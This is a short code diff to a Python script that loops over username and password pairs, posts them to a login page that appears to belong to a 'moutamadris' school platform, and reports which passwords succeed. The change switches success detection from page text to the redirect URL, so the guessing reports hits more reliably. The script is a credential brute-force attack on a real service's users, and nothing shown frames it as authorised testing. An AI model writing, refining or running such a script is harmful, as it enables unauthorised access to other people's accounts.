@@ -1,4 +1,3 @@
-
 import requests
 from bs4 import BeautifulSoup
 
@@ -35,9 +34,9 @@ with requests.Session() as s:
                     }
             r = s.post(Target, data = data)
             
-            if "/moutamadris/Dashboard" in r.text :
+            if "/moutamadris/Dashboard" in r.url :
                 print(user_1,"Find Password :",pass_2)
                 break;
-            elif "/moutamadris/Dashboard" not in r.text :
+            elif "/moutamadris/Account" in r.url :
                 print(user_1,"Error Password :",pass_2)
             
